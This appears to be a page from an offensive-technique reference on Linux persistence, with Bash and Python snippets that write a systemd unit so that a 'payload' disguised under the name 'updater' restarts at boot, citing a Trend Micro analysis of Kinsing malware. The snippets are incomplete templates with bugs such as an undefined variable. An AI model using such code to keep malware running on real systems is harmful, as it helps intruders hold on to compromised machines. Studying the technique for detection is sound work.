# System Daemon

## Scripting

### Bash

```bash
#!/bin/bash

BIN_FULL_PATH=
SERVICE_NAME=

function install_service() {
    local AUTOSTART_PATH="${1}"
    echo "[Unit]
    Description=Start daemon at boot time
    After=
    Requires=
    [Service]
    Type=forking
    RestartSec=10s
    Restart=always
    TimeoutStartSec=5
    ExecStart=${AUTOSTART_PATH}
    [Install]
    WantedBy=multi-user.target"
}

function autoinit() {
    install_service "${BIN_FULL_PATH}" > "/lib/systemd/system/${SERVICE_NAME}.service"
    systemctl enable "${SERVICE_NAME}.service"
    systemctl start "${SERVICE_NAME}.service"
}

function main() {
	install_service ""
	autoinit
}

main
```

### Python

```python
import os
import shutil

def persistence(payload_path, payload_name, payload_service):
    service = \
'''Description=daemon
Wants=network.target
After=syslog.target network-online.target
[Service]
Type=simple
ExecStart={}
Restart=on-failure
RestartSec=10
KillMode=process
[Install]
WantedBy=multi-user.target'''.format(payload_path)

    with open(payload_service, 'w') as f:
        f.write(service)

    try:
        shutil.copy2(payload_service, f'/lib/systemd/system/{payload_name}.service')
    except:
        pass
    
    commands = f'systemctl daemon-reload; systemctl enable {payload_name}.service; \
        systemctl start {payload_name}.service'

    os.system(commands)

def main():
	payload_name = 'updater'
	payload_path = os.path.join(home_directory, payload_name)
	payload_service = os.path.join(payload_path, 'payload.service')

	persistence(payload_path, payload_name, payload_service)

if __name__ == '__main__':
	main()
```

---
## References

### Trend Micro

- [Trend Micro: Analysis of Kinsing Malware's Use of Rootkit](https://www.trendmicro.com/en_dk/research/20/k/analysis-of-kinsing-malwares-use-of-rootkit.html)